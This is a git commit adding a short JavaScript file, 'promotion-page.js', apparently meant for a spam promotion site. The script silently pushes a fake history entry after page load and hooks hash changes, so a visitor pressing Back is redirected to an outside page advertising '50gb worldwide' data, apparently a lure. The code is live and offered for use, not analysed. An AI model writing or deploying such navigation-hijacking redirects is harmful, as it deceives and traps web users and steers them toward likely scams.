385a177806d8b69338aa920916421664ca18f39b
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-07-14 00:18:45 -0700

    Create promotion-page.js

---
+++ promotion-page.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://ekpaebot.github.io/fresh/50gb-worldwide.html";
+    }
+    function goon(){
+        location.href="https://ekpaebot.github.io/fresh/50gb-worldwide.html";
+    }
